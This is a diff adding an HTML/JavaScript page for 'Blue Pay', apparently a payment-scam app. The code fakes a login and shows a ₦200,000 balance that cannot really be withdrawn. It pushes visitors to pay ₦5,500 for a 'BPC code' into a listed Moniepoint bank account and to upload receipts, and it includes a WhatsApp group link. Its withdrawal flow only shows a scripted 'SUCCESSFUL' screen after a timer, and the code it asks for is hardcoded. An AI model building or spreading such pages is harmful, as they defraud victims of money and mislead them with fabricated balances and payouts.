@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Blue Pay</title>
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
+}
+
+body{
+    background:#f3eeee;
+}
+
+/* LOGIN PAGE */
+
+#loginPage{
+    width:100%;
+    min-height:100vh;
+    padding:30px;
+}
+
+.help{
+    text-align:right;
+    color:orange;
+    font-size:15px;
+    font-weight:bold;
+    margin-top:10px;
+}
+
+.login-box{
+    margin-top:140px;
+}
+
+.logo{
+    color:#001dff;
+    font-size:24px;
+    font-weight:700;
+    margin-bottom:8px;
+}
+
+.subtitle{
+    font-size:14px;
+    margin-bottom:35px;
+    color:#111;
+}
+
+.input-box{
+    width:100%;
+    height:52px;
+    border:2px solid #222;
+    border-radius:18px;
+    padding-left:18px;
+    font-size:15px;
+    margin-bottom:22px;
+    background:#fff;
+    outline:none;
+}
+
+.login-btn{
+    width:88%;
+    height:52px;
+    background:#000;
+    color:#fff;
+    border:none;
+    border-radius:18px;
+    font-size:15px;
+    display:block;
+    margin:10px auto;
+}
+
+.forgot{
+    font-size:14px;
+    color:#001dff;
+    margin-top:22px;
+    display:inline-block;
+}
+
+/* DASHBOARD */
+
+#dashboard{
+    display:none;
+    min-height:100vh;
+    padding:25px;
+    background:#f3eeee;
+}
+
+.top{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-top:18px;
+}
+
+.profile{
+    font-size:18px;
+    font-weight:700;
+}
+
+.bell{
+    font-size:20px;
+}
+
+.card{
+    width:100%;
+    background:#1b22ff;
+    border-radius:24px;
+    padding:22px;
+    color:white;
+    margin-top:24px;
+    min-height:190px;
+}
+
+.card-title{
+    font-size:14px;
+}
+
+.amount{
+    font-size:16px;
+    font-weight:600;
+    margin-top:14px;
+}
+
+.withdraw-btn{
+    float:right;
+    margin-top:-28px;
+    background:#f1f1f1;
+    color:#111;
+    border:none;
+    padding:7px 14px;
+    font-size:10px;
+    border-radius:3px;
+}
+
+.target{
+    margin-top:70px;
+    font-size:13px;
+}
+
+.menu{
+    display:flex;
+    justify-content:space-around;
+    margin-top:90px;
+    font-size:15px;
+    font-weight:700;
+}
+
+.menu div{
+    cursor:pointer;
+}
+
+.footer-blue{
+    width:100%;
+    height:60px;
+    background:blue;
+    position:fixed;
+    bottom:0;
+    left:0;
+}
+
+/* POPUP */
+
+#popup{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,0.6);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    z-index:999;
+}
+
+.popup-box{
+    width:90%;
+    max-width:340px;
+    background:white;
+    border-radius:8px;
+    padding:20px 16px 24px;
+    text-align:center;
+}
+
+.welcome{
+    font-size:22px;
+    font-weight:700;
+    margin-bottom:10px;
+}
+
+.popup-text{
+    font-size:12px;
+    line-height:1.5;
+    color:#111;
+}
+
+.popup-buttons{
+    display:flex;
+    justify-content:center;
+    gap:10px;
+    margin-top:22px;
+}
+
+.close-btn,.reset-btn{
+    color:white;
+    border:none;
+    width:95px;
+    height:42px;
+    border-radius:8px;
+    font-size:14px;
+}
+
+.close-btn{
+    background:#ff5a36;
+}
+
+.reset-btn{
+    background:#0b00ff;
+}
+
+/* PAGES */
+
+.page{
+    display:none;
+    min-height:100vh;
+    background:#eceaea;
+}
+
+.blue-header{
+    background:#23286f;
+    color:white;
+    padding:40px 20px;
+    font-size:28px;
+    font-weight:700;
+}
+
+.form-area{
+    width:100%;
+    background:#f5f5f5;
+    border-radius:40px 40px 0 0;
+    margin-top:-10px;
+    padding:30px 20px 40px;
+}
+
+.label{
+    font-size:28px;
+    color:#777;
+    margin-bottom:15px;
+    margin-top:20px;
+}
+
+.pay-input{
+    width:100%;
+    height:90px;
+    border:2px solid #333;
+    border-radius:15px;
+    padding-left:20px;
+    font-size:22px;
+    outline:none;
+    background:#f5f5f5;
+}
+
+.pay-input:disabled{
+    background:#e8e8e8;
+    color:#333;
+    cursor:not-allowed;
+}
+
+.pay-btn{
+    width:100%;
+    height:70px;
+    background:#23286f;
+    color:white;
+    border:none;
+    border-radius:14px;
+    font-size:24px;
+    margin-top:50px;
+}
+
+.powered{
+    text-align:center;
+    margin-top:50px;
+    color:#777;
+    font-size:18px;
+}
+
+/* SECOND PAGE */
+
+.top-bar{
+    background:#d7d5d5;
+    padding:18px;
+    font-size:20px;
+    display:flex;
+    justify-content:space-between;
+}
+
+.cancel{
+    color:red;
+}
+
+.payment-box{
+    width:90%;
+    margin:25px auto;
+    border:2px solid #aaa;
+    background:white;
+}
+
+.pay-inner{
+    padding:25px;
+}
+
+.warn{
+    font-size:18px;
+    line-height:1.6;
+    text-align:center;
+    margin-bottom:30px;
+}
+
+.detail{
+    margin-bottom:30px;
+}
+
+.detail-title{
+    font-size:17px;
+}
+
+.detail-value{
+    font-size:20px;
+    font-weight:bold;
+    margin-top:6px;
+}
+
+.green-btn{
+    width:100%;
+    height:65px;
+    background:green;
+    border:none;
+    color:white;
+    font-size:24px;
+    margin-top:25px;
+}
+
+/* VERIFY PAGE */
+
+.verify-box{
+    width:90%;
+    margin:30px auto;
+}
+
+.upload{
+    width:100%;
+    padding:15px;
+    background:white;
+    border-radius:12px;
+    margin-top:15px;
+    border:2px solid #1b22ff;
+}
+
+/* WITHDRAW PAGE */
+
+.withdraw-page{
+    background:#ececf1;
+    min-height:100vh;
+    display:none;
+}
+
+.withdraw-header{
+    background:#2b2bff;
+    color:white;
+    text-align:center;
+    padding:35px;
+    font-size:28px;
+    font-weight:700;
+}
+
+.withdraw-card{
+    width:86%;
+    background:#f4f4f4;
+    margin:40px auto;
+    border-radius:24px;
+    padding:25px;
+}
+
+.withdraw-input{
+    width:100%;
+    height:75px;
+    border:3px solid #2b2bff;
+    border-radius:16px;
+    margin-bottom:18px;
+    padding-left:18px;
+    font-size:18px;
+    background:#f4f4f4;
+}
+
+.balance{
+    text-align:center;
+    font-size:18px;
+    margin-top:5px;
+}
+
+.submit-btn{
+    width:100%;
+    height:70px;
+    border:none;
+    background:#2b2bff;
+    color:white;
+    border-radius:16px;
+    font-size:20px;
+    font-weight:bold;
+    margin-top:20px;
+}
+
+/* WATCH PAGE */
+
+.watch-container{
+    padding:20px;
+}
+
+.watch-text{
+    margin-top:25px;
+    font-size:20px;
+    font-weight:bold;
+    text-align:center;
+}
+
+</style>
+</head>
+<body>
+<!-- LOGIN -->
+<div id="loginPage">
+<div class="help">Need Help?</div>
+<div class="login-box">
+<div class="logo">Blue Pay</div>
+<div class="subtitle">
+Login or create an account to continue
+</div>
+<input type="email" id="email" class="input-box" placeholder="Enter Email">
+<input type="password" id="password" class="input-box" placeholder="Enter Password">
+<button class="login-btn" onclick="loginUser()">
+Login / Register
+</button>
+<a href="#" class="forgot">Forgot Password?</a>
+</div>
+</div>
+
+<!-- DASHBOARD -->
+<div id="dashboard">
+<div class="top">
+<div class="profile">👤 Hi, chri!</div>
+<div class="bell">🔔</div>
+</div>
+
+<div class="card">
+<div class="card-title">Today Spent</div>
+<div class="amount" id="balanceAmount">₦200000</div>
+<button class="withdraw-btn" onclick="openWithdraw()">
+Withdraw
+</button>
+<div class="target">
+Daily spend target: ₦ 200,000
+</div>
+</div>
+
+<div class="menu">
+<div>Reset</div>
+<div onclick="openBPC()">Buy BPC</div>
+<div onclick="openWatch()">Watch</div>
+</div>
+
+<div class="menu" style="margin-top:120px;">
+<div>Contact</div>
+<div onclick="openGroup()">Group</div>
+<div>Faq</div>
+</div>
+
+<div class="footer-blue"></div>
+</div>
+
+<!-- POPUP -->
+<div id="popup">
+<div class="popup-box">
+<div class="welcome">Welcome</div>
+<div class="popup-text">
+<span style="color:blue;">chri</span>
+you have been given 200,000 to withdraw every day.
+dont click on the reset button until tomorrow,
+else you will be baned join group
+<span style="color:blue;">Here</span>
+</div>
+<div class="popup-buttons">
+<button class="close-btn" onclick="closePopup()">
+Close
+</button>
+<button class="reset-btn">
+Reset
+</button>
+</div>
+</div>
+</div>
+
+<!-- FIRST PAGE -->
+<div id="bpcPage" class="page">
+<div class="blue-header">
+Blue Pay
+</div>
+
+<div class="form-area">
+<div class="label">Amount</div>
+<input class="pay-input" id="bpcAmount" value="₦5500" readonly>
+<div class="label">Full Name</div>
+<input class="pay-input" placeholder="Your full name">
+<div class="label">Your Email Address</div>
+<input class="pay-input" placeholder="email address">
+<button class="pay-btn" onclick="openSecondPage()">
+Pay
+</button>
+<div class="powered">
+Powered by flutterwave
+</div>
+</div>
+</div>
+
+<!-- SECOND PAGE -->
+<div id="paymentPage" class="page">
+<div class="top-bar">
+<div>Payment</div>
+<div class="cancel" onclick="backDashboard()">Cancel</div>
+</div>
+
+<div class="payment-box">
+<div class="pay-inner">
+<div class="warn">
+🚫 Do not pay with OPay or PalmPay.<br>
+Payments made with these apps will not be confirmed.<br>
+✅ You can use any other bank.
+</div>
+<div class="detail">
+<div class="detail-title">Amount</div>
+<div class="detail-value">NGN 5500</div>
+</div>
+<div class="detail">
+<div class="detail-title">Account Number</div>
+<div class="detail-value">6720412506</div>
+</div>
+<div class="detail">
+<div class="detail-title">Bank Name</div>
+<div class="detail-value">Moniepoint</div>
+</div>
+<div class="detail">
+<div class="detail-title">Account Name</div>
+<div class="detail-value">Desmond</div>
+</div>
+<button class="green-btn" onclick="openVerifyPage()">
+I have made the Payment
+</button>
+</div>
+</div>
+</div>
+
+<!-- VERIFY RECEIPT PAGE -->
+<div id="verifyPage" class="page">
+<div class="blue-header">
+Blue Pay Verify Receipt
+</div>
+
+<div class="verify-box">
+<input class="pay-input" placeholder="Account Name">
+<input class="pay-input" placeholder="Account Number" style="margin-top:20px;">
+<input class="pay-input" placeholder="Bank Used" style="margin-top:20px;">
+<div class="upload">
+<input type="file">
+</div>
+<button class="pay-btn" onclick="submitReceipt()">
+Submit
+</button>
+</div>
+</div>
+
+<!-- WITHDRAW PAGE -->
+<div id="withdrawPage" class="withdraw-page">
+<div class="withdraw-header">
+💸 Withdraw to Bank
+</div>
+
+<div class="withdraw-card">
+<input type="text" class="withdraw-input" placeholder="Account Name">
+<input type="number" class="withdraw-input" placeholder="Account Number">
+<select class="withdraw-input">
+<option>Select Bank</option>
+<option>OPay</option>
+<option>Moniepoint</option>
+<option>Palmpay</option>
+<option>Kuda</option>
+<option>GTBank</option>
+<option>Access Bank</option>
+</select>
+<input type="number" class="withdraw-input" placeholder="Enter Amount">
+<input type="password" id="bpcCode" class="withdraw-input" placeholder="Enter BPC Code">
+<div class="balance">
+Available Balance: ₦200,000.00
+</div>
+<button class="submit-btn" onclick="submitWithdrawal()">
+Submit Withdrawal
+</button>
+</div>
+</div>
+
+<!-- WATCH PAGE -->
+<div id="watchPage" class="page">
+<div class="blue-header">
+Watch & Earn
+</div>
+
+<div class="watch-container">
+<video id="rewardVideo"
+width="100%"
+controls
+style="border-radius:20px;background:black;">
+<source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+</video>
+<div class="watch-text">
+Watch complete video to earn ₦20,000
+</div>
+<button class="pay-btn"
+style="margin-top:30px;"
+onclick="finishVideoReward()">
+Claim Reward
+</button>
+</div>
+</div>
+
+<script>
+
+let balance = 200000;
+
+function updateBalance(){
+document.getElementById("balanceAmount").innerText =
+"₦" + balance.toLocaleString();
+}
+
+function loginUser(){
+let email=document.getElementById("email").value;
+let password=document.getElementById("password").value;
+
+if(email==="" || password===""){
+alert("Please enter email and password");
+return;
+}
+
+document.getElementById("loginPage").style.display="none";
+document.getElementById("dashboard").style.display="block";
+document.getElementById("popup").style.display="flex";
+
+updateBalance();
+}
+
+function closePopup(){
+document.getElementById("popup").style.display="none";
+}
+
+function openBPC(){
+document.getElementById("dashboard").style.display="none";
+document.getElementById("bpcPage").style.display="block";
+}
+
+function openSecondPage(){
+document.getElementById("bpcPage").style.display="none";
+document.getElementById("paymentPage").style.display="block";
+}
+
+function openVerifyPage(){
+document.getElementById("paymentPage").style.display="none";
+document.getElementById("verifyPage").style.display="block";
+}
+
+function submitReceipt(){
+alert("Receipt Submitted Successfully");
+document.getElementById("verifyPage").style.display="none";
+document.getElementById("dashboard").style.display="block";
+}
+
+function backDashboard(){
+document.getElementById("paymentPage").style.display="none";
+document.getElementById("dashboard").style.display="block";
+}
+
+function openWithdraw(){
+document.getElementById("dashboard").style.display="none";
+document.getElementById("withdrawPage").style.display="block";
+}
+
+function submitWithdrawal(){
+let code =
+document.getElementById("bpcCode").value;
+
+let amountInput =
+document.querySelectorAll(".withdraw-input")[3];
+
+let withdrawAmount =
+parseInt(amountInput.value);
+
+if(code !== "bpc202011"){
+alert("Invalid BPC Code");
+return;
+}
+
+if(withdrawAmount > balance || withdrawAmount <= 0){
+alert("Invalid Amount");
+return;
+}
+
+document.getElementById("withdrawPage").innerHTML = `
+
+<div style="
+width:100%;
+height:100vh;
+background:#ececf1;
+display:flex;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+">
+
+<div style="
+width:120px;
+height:120px;
+border-radius:50%;
+background:#2b2bff;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:60px;
+color:white;
+animation:pulse 1s infinite;
+">
+
+⏳
+
+</div>
+
+<div style="
+margin-top:30px;
+font-size:28px;
+font-weight:bold;
+color:#2b2bff;
+">
+
+Initiating Withdrawal...
+
+</div>
+
+</div>
+
+<style>
+
+@keyframes pulse{
+
+0%{
+transform:scale(1);
+}
+
+50%{
+transform:scale(1.1);
+}
+
+100%{
+transform:scale(1);
+}
+
+}
+
+</style>
+`;
+
+setTimeout(function(){
+
+balance -= withdrawAmount;
+
+updateBalance();
+
+document.getElementById("withdrawPage").innerHTML = `
+
+<div style="
+width:100%;
+height:100vh;
+background:#ececf1;
+display:flex;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+padding:20px;
+">
+
+<div style="
+width:130px;
+height:130px;
+border-radius:50%;
+background:green;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:70px;
+color:white;
+">
+
+✔
+
+</div>
+
+<div style="
+margin-top:35px;
+font-size:32px;
+font-weight:bold;
+color:green;
+text-align:center;
+">
+
+SUCCESSFUL
+
+</div>
+
+<div style="
+margin-top:15px;
+font-size:22px;
+text-align:center;
+color:#333;
+">
+
+Verify from your bank
+
+</div>
+
+<button onclick="finishWithdrawal()"
+style="
+margin-top:40px;
+width:260px;
+height:65px;
+border:none;
+border-radius:14px;
+background:#2b2bff;
+color:white;
+font-size:22px;
+font-weight:bold;
+">
+
+Back To Dashboard
+
+</button>
+
+</div>
+
+`;
+
+},10000);
+
+}
+
+function finishWithdrawal(){
+document.getElementById("withdrawPage").style.display = "none";
+document.getElementById("dashboard").style.display = "block";
+}
+
+/* GROUP LINK */
+
+function openGroup(){
+window.location.href =
+"https://chat.whatsapp.com/FrxzoKGiL4RC3N1ayGAfIf";
+}
+
+/* WATCH PAGE */
+
+function openWatch(){
+document.getElementById("dashboard").style.display="none";
+document.getElementById("watchPage").style.display="block";
+}
+
+function finishVideoReward(){
+let video =
+document.getElementById("rewardVideo");
+
+if(video.ended){
+balance += 20000;
+updateBalance();
+alert("₦20,000 Added Successfully");
+document.getElementById("watchPage").style.display="none";
+document.getElementById("dashboard").style.display="block";
+}else{
+alert("Finish the full video first");
+}
+}
+
+</script>
+</body>
+</html>
